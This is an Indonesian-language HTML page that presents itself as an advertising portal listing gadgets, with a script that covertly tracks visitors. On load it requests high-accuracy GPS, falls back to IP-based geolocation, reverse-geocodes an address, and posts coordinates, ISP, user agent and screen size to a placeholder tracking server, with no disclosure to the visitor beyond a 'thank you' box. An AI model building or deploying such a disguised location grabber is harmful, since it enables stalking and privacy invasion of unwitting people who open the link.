<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Iklan Terkini</title>
   <link rel="stylesheet" href="style.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            background: linear-gradient(135deg, #3498db, #8e44ad);
            color: white;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .description {
            font-size: 1.1rem;
            max-width: 800px;
            margin: 0 auto;
        }
        
        .ads-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .ad-card {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            transition: transform 0.3s ease;
        }
        
        .ad-card:hover {
            transform: translateY(-5px);
        }
        
        .ad-image {
            height: 180px;
            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
        }
        
        .ad-content {
            padding: 15px;
        }
        
        .ad-title {
            font-size: 1.2rem;
            margin-bottom: 10px;
            color: #2c3e50;
        }
        
        .ad-description {
            color: #7f8c8d;
            margin-bottom: 15px;
        }
        
        .ad-price {
            font-weight: bold;
            color: #e74c3c;
            font-size: 1.1rem;
        }
        
        .ad-cta {
            display: block;
            background: #3498db;
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 5px;
            text-decoration: none;
            margin-top: 10px;
            transition: background 0.3s ease;
        }
        
        .ad-cta:hover {
            background: #2980b9;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 0.9rem;
            border-top: 1px solid #ecf0f1;
        }
        
        .tracking-info {
            background: #e8f4fc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 0.9rem;
            display: none;
        }
        
        .stats-container {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .stat-card {
            background: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            min-width: 150px;
            margin: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: bold;
            color: #3498db;
        }
        
        .stat-label {
            color: #7f8c8d;
            margin-top: 5px;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="notification" id="notification">
        Pengunjung baru terdeteksi!
    </div>

    <div class="container">
        <header>
            <h1>Portal Iklan Terkini</h1>
            <p class="description">Temukan produk dan layanan terbaik dengan penawaran spesial</p>
        </header>
        
        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-value" id="visitorCount">0</div>
                <div class="stat-label">Pengunjung</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="activeAds">12</div>
                <div class="stat-label">Iklan Aktif</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="todayVisitors">0</div>
                <div class="stat-label">Hari Ini</div>
            </div>
        </div>
        
        <div class="ads-grid">
            <div class="ad-card">
                <div class="ad-image">Smartphone X1</div>
                <div class="ad-content">
                    <h3 class="ad-title">Smartphone Terbaru 2023</h3>
                    <p class="ad-description">Dapatkan smartphone dengan fitur canggih dan harga terjangkau.</p>
                    <div class="ad-price">Rp 3.499.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
            
            <div class="ad-card">
                <div class="ad-image">Kursi Gaming</div>
                <div class="ad-content">
                    <h3 class="ad-title">Kursi Gaming Premium</h3>
                    <p class="ad-description">Nyaman untuk marathon gaming atau kerja dari rumah.</p>
                    <div class="ad-price">Rp 1.799.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
            
            <div class="ad-card">
                <div class="ad-image">Laptop Pro</div>
                <div class="ad-content">
                    <h3 class="ad-title">Laptop Profesional</h3>
                    <p class="ad-description">Cocok untuk pekerjaan dan produktivitas sehari-hari.</p>
                    <div class="ad-price">Rp 8.999.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
            
            <div class="ad-card">
                <div class="ad-image">Headphone</div>
                <div class="ad-content">
                    <h3 class="ad-title">Headphone Wireless</h3>
                    <p class="ad-description">Suara jernih dengan noise cancellation terbaik.</p>
                    <div class="ad-price">Rp 1.299.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
            
            <div class="ad-card">
                <div class="ad-image">Smart Watch</div>
                <div class="ad-content">
                    <h3 class="ad-title">Smart Watch Series 5</h3>
                    <p class="ad-description">Pantau kesehatan dan aktivitas harian Anda.</p>
                    <div class="ad-price">Rp 2.499.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
            
            <div class="ad-card">
                <div class="ad-image">Kamera DSLR</div>
                <div class="ad-content">
                    <h3 class="ad-title">Kamera DSLR Profesional</h3>
                    <p class="ad-description">Hasilkan foto berkualitas tinggi dengan mudah.</p>
                    <div class="ad-price">Rp 12.999.000</div>
                    <a href="#" class="ad-cta">Beli Sekarang</a>
                </div>
            </div>
        </div>
        
        <div class="tracking-info" id="trackingInfo">
            <h3>Iklan produk</h3>
            <p>Terimakasih Sudah menugnjugi.</p>
        </div>
        
        <div class="footer">
            <p>Portal Iklan Terkini &copy; 2023 | Menghubungkan pembeli dan penjual</p>
        </div>
    </div>

    <script>
        // Simpan visitor count di localStorage
        function updateVisitorCount() {
            let count = localStorage.getItem('visitorCount');
            let todayCount = localStorage.getItem('todayVisitors');
            const today = new Date().toDateString();
            
            // Initialize jika belum ada
            if (!count) {
                count = 0;
            }
            if (!todayCount || localStorage.getItem('lastVisitDate') !== today) {
                todayCount = 0;
                localStorage.setItem('lastVisitDate', today);
            }
            
            // Increment counts
            count = parseInt(count) + 1;
            todayCount = parseInt(todayCount) + 1;
            
            // Save to localStorage
            localStorage.setItem('visitorCount', count);
            localStorage.setItem('todayVisitors', todayCount);
            
            // Update UI
            document.getElementById('visitorCount').textContent = count;
            document.getElementById('todayVisitors').textContent = todayCount;
            
            return count;
        }
        
        // Fungsi untuk mendapatkan lokasi pengguna
        function trackUserLocation() {
            // Update visitor count
            const visitorNumber = updateVisitorCount();
            
            // Tampilkan notifikasi
            const notification = document.getElementById('notification');
            notification.textContent = `Pengunjung #${visitorNumber} terdeteksi!`;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
            
            // Coba dapatkan lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // Success callback
                    function(position) {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        
                        // Dapatkan informasi tambahan
                        const userAgent = navigator.userAgent;
                        const timestamp = new Date().toISOString();
                        const screenRes = `${screen.width}x${screen.height}`;
                        
                        // Tampilkan di console
                        console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                        console.log('üö® PENGUNJUNG BARU DETECTED!');
                        console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                        console.log(`üìç Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
                        console.log(`üéØ Akurasi: ¬±${Math.round(acc)} meter`);
                        console.log(`üÜî Visitor ID: #${visitorNumber}`);
                        console.log(`üïí Waktu: ${new Date().toLocaleString()}`);
                        console.log(`üíª User Agent: ${userAgent}`);
                        console.log(`üì± Screen: ${screenRes}`);
                        console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                        
                        // Coba dapatkan alamat
                        getAddressFromCoords(lat, lng);
                        
                        // Kirim data ke server (simulasi)
                        sendToServer({
                            type: 'gps_location',
                            visitorId: visitorNumber,
                            coordinates: { lat, lng },
                            accuracy: acc,
                            timestamp: timestamp,
                            userAgent: userAgent,
                            screenResolution: screenRes
                        });
                    },
                    // Error callback - fallback ke IP-based location
                    function(error) {
                        console.log('GPS tidak tersedia, menggunakan IP-based location');
                        getLocationByIP(visitorNumber);
                    },
                    // Options
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 300000
                    }
                );
            } else {
                console.log('Geolocation tidak didukung, menggunakan IP-based location');
                getLocationByIP(visitorNumber);
            }
        }
        
        // Fungsi untuk mendapatkan lokasi berdasarkan IP
        function getLocationByIP(visitorNumber) {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const lat = data.latitude;
                    const lng = data.longitude;
                    const city = data.city;
                    const country = data.country_name;
                    const isp = data.org;
                    
                    // Tampilkan di console
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    console.log('üö® PENGUNJUNG BARU DETECTED!');
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    console.log(`üìç Lokasi (IP): ${city}, ${country}`);
                    console.log(`üì° ISP: ${isp}`);
                    console.log(`üéØ Koordinat Perkiraan: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
                    console.log(`üÜî Visitor ID: #${visitorNumber}`);
                    console.log(`üïí Waktu: ${new Date().toLocaleString()}`);
                    console.log(`üíª User Agent: ${navigator.userAgent}`);
                    console.log(`üì± Screen: ${screen.width}x${screen.height}`);
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    
                    // Kirim data ke server (simulasi)
                    sendToServer({
                        type: 'ip_location',
                        visitorId: visitorNumber,
                        coordinates: { lat, lng },
                        location: `${city}, ${country}`,
                        isp: isp,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        screenResolution: `${screen.width}x${screen.height}`
                    });
                })
                .catch(error => {
                    console.error('Error getting IP location:', error);
                    
                    // Fallback ke data minimal
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    console.log('üö® PENGUNJUNG BARU DETECTED!');
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    console.log(`üìç Lokasi: Tidak dapat dideteksi`);
                    console.log(`üÜî Visitor ID: #${visitorNumber}`);
                    console.log(`üïí Waktu: ${new Date().toLocaleString()}`);
                    console.log(`üíª User Agent: ${navigator.userAgent}`);
                    console.log(`üì± Screen: ${screen.width}x${screen.height}`);
                    console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
                    
                    sendToServer({
                        type: 'minimal_data',
                        visitorId: visitorNumber,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        screenResolution: `${screen.width}x${screen.height}`
                    });
                });
        }
        
        // Fungsi untuk mendapatkan alamat dari koordinat
        function getAddressFromCoords(lat, lng) {
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.display_name) {
                        console.log(`üè† Alamat Perkiraan: ${data.display_name}`);
                    }
                })
                .catch(error => {
                    console.error('Error getting address:', error);
                });
        }
        
        function sendToServer(data) {
    fetch('https://your-server.com/api/track-visitor', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Data berhasil dikirim ke server');
    })
    .catch(error => {
        console.error('Error sending data to server:', error);
    });
}
        
        
        // Jalakan tracking ketika halaman dimuat
        window.addEventListener('load', function() {
            // Tampilkan info tracking
            document.getElementById('trackingInfo').style.display = 'block';
            
            // Mulai tracking
            trackUserLocation();
            
            // Simulasi klik pada iklan (untuk testing)
            document.querySelectorAll('.ad-cta').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.preventDefault();
                    console.log(`üñ±Ô∏è Pengunjung mengklik iklan: ${this.closest('.ad-card').querySelector('.ad-title').textContent}`);
                });
            });
        });
        
        // Track ketika pengguna meninggalkan halaman
        window.addEventListener('beforeunload', function() {
            console.log('üëã Pengunjung meninggalkan website');
        });
    </script>
</body>
</html>